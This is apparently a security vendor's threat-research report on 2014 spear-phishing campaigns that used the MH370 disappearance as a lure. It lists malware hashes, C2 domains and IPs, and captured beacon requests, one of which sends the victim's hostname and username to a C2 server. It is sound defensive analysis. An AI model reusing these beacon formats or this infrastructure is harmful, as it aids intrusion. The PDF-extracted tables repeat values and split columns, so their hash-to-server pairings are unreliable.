The recent tragic disappearance of flight MH 370 is no exception. This\npost will examine multiple instances from different threat groups, all using spear-phishing messages and\nleveraging the disappearance of Flight 370 as a lure to convince the target to open a malicious\nattachment.\n\n**“Admin@338” Targets an APAC Government and U.S. Think Tank**\n\nThe first spear phish from group “Admin@338” was sent to a foreign government in the Asian Pacific\nregion on March 10, 2014 – just two days after the flight disappeared. The threat actors sent a spearphishing email with an attachment titled, “Malaysian Airlines MH370.doc” (MD5:\n9c43a26fe4538a373b7f5921055ddeae). Although threat actors often include some sort of “decoy\ncontent” upon successful exploitation (that is, a document representing what the recipient expected to\nopen), in this case, the user is simply shown a blank document.\n\nThe attachment dropped a Poison Ivy variant into the path\nC:\\DOCUME~1\\admin\\LOCALS~1\\Temp\\kav.exe (MD5: 9dbe491b7d614251e75fb19e8b1b0d0d), which,\nin turn, beaconed outbound to www.verizon.proxydns[.]com. This Poison Ivy variant was configured with\n\n\n-----\n\nthe connection password wwwst@Admin. The APT group we refer to as Admin@338 has previously\nused Poison Ivy implants with this same password. We document the Admin@338 group’s activities in\nour [Poison Ivy: Assessing Damage and Extracting Intelligence paper. Further, the domain](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf)\nwww.verizon.proxydns[.]com previously resolved to the following IP addresses that have also been used\nby the Admin@338 group:\n\n**IP Address** **First Seen** **Last Seen**\n\n103.31.241.110 103.31.241.110 2013-08-27 2013-08-27 2013-08-28 2013-08-28\n\n174.139.242.19 174.139.242.19 2013-08-28 2013-08-28 2013-08-31 2013-08-31\n\n58.64.153.157 58.64.153.157 2013-09-03 2013-09-03 2014-03-07 2014-03-07\n\n59.188.0.197 59.188.0.197 2014-03-07 2014-03-07 2014-03-19 2014-03-19\n\nA second targeted attack attributed to the same Admin@338 group was sent to a prominent U.S.-based\nthink tank on March 14, 2014. This spear phish contained an attachment that dropped “Malaysian\nAirlines MH370 5m Video.exe” (MD5: b869dc959daac3458b6a81bc006e5b97). The malware sample\nwas crafted to appear as though it was a Flash video, by binding a Flash icon to the malicious\nexecutable.\n\nInterestingly, in this case, the malware sets its persistence in the normal “Run” registry location, but it\ntries to auto start the payload from the disk directory “c:\\programdata”, which doesn’t exist until Windows\n7, so a simple reboot would mitigate this threat on Windows XP. This suggests the threat actors did not\nperform quality control on the malware or were simply careless. We detect this implant as\n**Backdoor.APT.WinHTTPHelper. The Admin@338 group discussed above has used variants of this**\n[same malware family in previous targeted attacks.](https://www.fireeye.com/blog/threat-research/2013/10/know-your-enemy-tracking-a-rapidly-evolving-apt-actor.html)\n\nThis specific implant beacons out to dpmc.dynssl[.]com:443 and www.dpmc.dynssl[.]com:80. The\ndomain dpmc.dynssl[.]com resolved to the following IPs:\n\n**IP Address** **First Seen** **Last Seen**\n\n31.193.133.101 31.193.133.101 2013-11-01 2013-11-01 2013-11-29 2013-11-29\n\n58.64.153.157 58.64.153.157 2014-01-10 2014-01-10 2014-03-08 2014-03-08\n\n59.188.0.197 59.188.0.197 2014-03-14 2014-03-14 2014-03-17 2014-03-17\n\n\n-----\n\n139.191.142.168 139.191.142.168 2014-03-17 2014-03-17 2014-03-19 2014-03-19\n\nThe www.dpmc.dynssl[.]com domain resolved to following IPs:\n\n**IP Address** **First Seen** **Last Seen**\n\n31.193.133.101 31.193.133.101 2013-10-30 2013-10-30 2013-11-29 2013-11-29\n\n58.64.153.157 58.64.153.157 2014-01-10 2014-01-10 2014-03-08 2014-03-08\n\n59.188.0.197 59.188.0.197 2014-03-14 2014-03-14 2014-03-18 2014-03-18\n\n139.191.142.168 139.191.142.168 2014-03-17 2014-03-17 2014-03-19 2014-03-19\n\nNote that the www.verizon.proxydns[.]com domain used by the Poison Ivy discussed above also\nresolved to both 58.64.153.157 and 59.188.0.197 during the same time frame as the\nBackdoor.APT.WinHTTPHelper command and control (CnC) located at dpmc.dynssl[.]com and\nwww.dpmc.dynssl[.]com.\n\nIn addition to the above activity attributed to the Admin@338 group, a number of other malicious\ndocuments abusing the missing Flight 370 story were also seen in the wild. Other threat groups likely\nsent these other documents.\n\n**The Naikon Lures**\n\nOn March 9, 2014, a malicious executable entitled the “Search for MH370 continues as report says FBI\nagents on way to offer assistance.pdf .exe“ (MD5: 52408bffd295b3e69e983be9bdcdd6aa) was seen\ncirculating in the wild. This sample beacons to the CnC net.googlereader[.]pw:443. We have identified\nthis sample, via forensic analysis, as Backdoor.APT.Naikon.\n\nIt uses a standard technique of changing its icon to make it appear to be a PDF, in order to lend to its\ncredibility. This same icon, embedded as a PE Resource, has been used in the following recent\nsamples:\n\n**MD5** **Import hash** **CnC Server**\n\n\n-----\n\nfcc59add998760b76f009b1fdfacf840\nfcc59add998760b76f009b1fdfacf840\n\n018f762da9b51d7557062548d2b91eeb\n018f762da9b51d7557062548d2b91eeb\n\nfcc59add998760b76f009b1fdfacf840\nfcc59add998760b76f009b1fdfacf840\n\n498aaf6df71211f9fcb8f182a71fc1f0\n498aaf6df71211f9fcb8f182a71fc1f0\n\na093440e75ff4fef256f5a9c1106069a\na093440e75ff4fef256f5a9c1106069a\n\n125dbbb742399ec2c39957920867ee60\n125dbbb742399ec2c39957920867ee60\n\n52408bffd295b3e69e983be9bdcdd6aa\n52408bffd295b3e69e983be9bdcdd6aa\n\n\ne30e07abf1633e10c2d1fbf34e9333d6\ne30e07abf1633e10c2d1fbf34e9333d6\n\ne30e07abf1633e10c2d1fbf34e9333d6\ne30e07abf1633e10c2d1fbf34e9333d6\n\ne30e07abf1633e10c2d1fbf34e9333d6\ne30e07abf1633e10c2d1fbf34e9333d6\n\na692dca39e952b61501a278ebafab97f\na692dca39e952b61501a278ebafab97f\n\na692dca39e952b61501a278ebafab97f\na692dca39e952b61501a278ebafab97f\n\na692dca39e952b61501a278ebafab97f\na692dca39e952b61501a278ebafab97f\n\na692dca39e952b61501a278ebafab97f\na692dca39e952b61501a278ebafab97f\n\n\necoh.oicp[.]net\necoh.oicp[.]net\n\norayjue.eicp[.]net\norayjue.eicp[.]net\n\necoh.oicp[.]net:443\necoh.oicp[.]net:443\n\nxl.findmy[.]pw\nxl.findmy[.]pw\n\nxl.findmy[.]pw\nxl.findmy[.]pw\n\nuu.yahoomail[.]pw\nuu.yahoomail[.]pw\n\nnet.googlereader[.]pw\nnet.googlereader[.]pw\n\n\nThis malware leverages “pdfbind” to add a PDF into itself, as can be seen in the debugging strings, and\nwhen launched, the malware also presents a decoy document to the target:\n\n**The Plat1 Lures**\n\n\n-----\n\nOn March 10, 2014, we observed another sample that exploited CVE-2012-0158, titled MH370班机可以\n人员身份信息.doc” (MD5: 4ff2156c74e0a36d16fa4aea29f38ff8), which roughly translates to “MH370\nFlight Personnel Identity Information”. The malware that is dropped by the malicious Word document,\nwhich we detect as Trojan.APT.Plat1, begins to beacon to 59.188.253.216 via TCP over port 80. The\ndecoy document opened after exploitation is blank. The malicious document dropped the following\nimplants:\n\nC:\\Documents and Settings\\Administrator\\Application Data\\Intel\\ResN32.dll (MD5:\n2437f6c333cf61db53b596d192cafe64)\nC:\\Documents and Settings\\Administrator\\Application Data\\Intel\\~y.dll (MD5:\nd8540b23e52892c6009fdd5812e9c597)\n\nThe implants dropped by this malicious document both included unique PDB paths that can be used to\nfind related samples. These paths were as follows:\n\nE:\\Work\\T5000\\T5 Install\\ResN\\Release\\ResN32.pdb\nF:\\WORK\\PROJECT\\T5 Install\\InstDll\\Release\\InstDll.pdb\n\n[This malware family was also described in more detail here.](http://blog.cylance.com/grand-theft-auto-panda)\n\n**The Mongall/Saker Lures**\n\nAnother sample leveraging the missing airliner theme was seen on March 12, 2014. The malicious\ndocument exploited CVE-2012-0158 and was titled, “Missing Malaysia Airlines Flight 370.doc” (MD5:\n467478fa0670fa8576b21d860c1523c6). Although the extension looked like a Microsoft Office .DOC file,\nit was actually an .HTML Application (HTA) file. Once the exploit is successful, the payload makes itself\npersistent by adding a Windows shortcut (.LNK) file pointing to the malware in the “Startup” folder in the\nstart menu. It beacons outbound to comer4s.minidns[.]net:8070. The network callback pattern, shown\nbelow, is known by researchers as “Mongall” or “Saker”:\n\nGET /3010FC080[REDACTED] HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Wis NT 5.0; .NET CLR 1.1.4322)\n\nHost: comer4s.minidns.net:8070\n\nCache-Control: no-cache\n\nThe sample also drops a decoy file called “aa.doc” into the temp folder and displays the decoy content\nshown below:\n\n\n-----\n\n**The “Tranchulas” Lures**\n\nOn March 18, 2014 a sample entitled “Malysia Airline MH370 hijacked by Pakistan.zip” was sent as a\nZIP file (MD5: 7dff5c4ae1b1fea7ecbf7ab787da3468) that contained a Windows screensaver file\ndisguised as a PDF (MD5: b03edbb264aa0c980ab2974652688876). The ZIP file was hosted on\n[199.91.173.43. This IP address was previously used to host malicious files.](http://www.threatconnect.com/news/where-there-is-smoke-there-is-fire-south-asian-cyber-espionage-heats-up/)\n\nThe screen saver file drops “winservice.exe” (MD5: 828d4a66487d25b413cb19ef8ee7c783) which\nbegins beaconing to 199.91.173.45. This IP address was previously used to host a file entitled\n“obl_leaked_report.zip” (MD5: a4c7c79308139a7ee70aacf68bba814f).\n\nThe initial beacon to the command-and-control server is as follows:\n\nPOST /path_active.php?compname=[HOSTNAME]_[USERNAME] HTTP/1.1\nHost: 199.91.173.45\n\nAccept: */*\n\nContent-Length: 11\n\nContent-Type: application/x-www-form-urlencoded\n\n[This same control server was used in previous activity.](http://www.threatconnect.com/news/where-there-is-smoke-there-is-fire-south-asian-cyber-espionage-heats-up/)\n\n**The Page Campaign**\n\n\n-----\n\nA final malicious document was seen abusing the missing Flight 370 story on March 18, 2014. This\ndocument exploited CVE-2012-0158 and was entitled “MH370 PM statement 15.03.14 - FINAL.DOC”\n(MD5: 5e8d64185737f835318489fda46f31a6). This document dropped a Backdoor.APT.Page implant\nand connected to 122.10.89.85 on both port 80 and 443. The initial beacon traffic over port 80 is as\nfollows:\n\nGET /18110143/page_32180701.html HTTP/1.1\nAccept: */*\n\nCookie: XX=0; BX=0\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\n\nHost: 122.10.89.85\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nPragma: no-cache\n\n**Conclusion**\n\nWhile many APT actors have adopted strategic Web compromise as a delivery vector, it is apparent that\nspear phishing via email-based attachments or links to zip files remain popular with many threat actors,\nespecially when paired with lures discussing current media events. Network defenders should\nincorporate these facts into their user training programs and be on heightened alert for regular spearphishing campaigns, which leverage topics dominating the news cycle.\n\n_Acknowledgement: We thank Nart Villeneuve and Patrick Olsen for their support, research, and analysis_\n_on these findings._\n\n\n-----",
